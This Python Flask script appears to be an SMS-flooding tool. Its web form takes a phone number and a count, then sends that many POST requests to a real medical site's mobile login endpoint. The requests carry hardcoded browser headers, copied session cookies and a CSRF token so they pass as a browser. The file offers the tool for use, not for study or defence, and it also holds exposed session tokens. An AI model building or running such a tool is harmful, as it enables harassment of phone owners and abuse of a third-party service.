from flask import Flask, render_template, request
import requests

app = Flask(__name__)

TARGET_URL = "https://www.daktare.com/login/mobile"

HEADERS = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie": "_gid=GA1.2.1592276129.1748674739; _gat_gtag_UA_106797718_1=1; _fbp=fb.1.1748674740008.545231069639347230; XSRF-TOKEN=eyJpdiI6InpUTk1RVkJaXC93VEpoWHdPU2lIdE1RPT0iLCJ2YWx1ZSI6Imo4NjBWalJRYmtRMUp4XC9kYm45eVhiYmxjKzNpc016TVRPSjVWQm5ZN1ZBK1hnMGtuZkJSRG85VjdHOGhSOXBlIiwibWFjIjoiNjZhNWJkYjdlMjBhNmY0ZjA0MzY3NjA4MjZjYmU2MTU0OTU5NGY5MmI3NjBkOGU5YTlkZjJiMTZhYzZlOWU4OCJ9; daktarbhai_web_session=eyJpdiI6IjQ5M0ZuSzNnQUFzMnhDV0JjK3BiVFE9PSIsInZhbHVlIjoiTVRPUTNHN2RoVkNJR2lsTVlOWFN0NW5cL1FaM2Z6c202SlwvbTBmZTllU0RoTFI3ZEc4eXJKWVlMdm1xcnNwQmZnIiwibWFjIjoiNmJlMmU0MDkxYThmMzllZTAxNjNhMGFlMjkzMGYyZWM4NGExZTMwNDVjNDUwODQ1ZTg1ODlmN2Q2MTE4YTdhMSJ9; _ga=GA1.1.1905048084.1748674739; _ga_H0CWDNCVZL=GS2.1.s1748674739$o1$g1$t1748674741$j58$l0$h0",
    "Host": "www.daktare.com",
    "Origin": "https://www.daktare.com",
    "Referer": "https://www.daktare.com/signin",
    "Sec-Ch-Ua": "\"Chromium\";v=\"136\", \"Microsoft Edge\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
    "X-Csrf-Token": "Ri9D6kkkkQRMqa0GNh4rAUgSiUMOkXofQReRoshH",
    "X-Requested-With": "XMLHttpRequest"
}

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        mobile = request.form.get('mobile')
        count = request.form.get('count', type=int)

        error = None
        if not mobile:
            error = "Mobile number is required."
        elif not count or count < 1:
            error = "Count must be an integer greater than 0."

        if error:
            return render_template('index.html', error=error, mobile=mobile, count=count)

        results = []
        for i in range(count):
            data = {'mobile': mobile}
            try:
                response = requests.post(TARGET_URL, headers=HEADERS, data=data)
                results.append({
                    'attempt': i + 1,
                    'status_code': response.status_code,
                    'response_text': response.text
                })
            except Exception as e:
                results.append({
                    'attempt': i + 1,
                    'error': str(e)
                })

        return render_template('index.html', results=results, mobile=mobile, count=count)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)

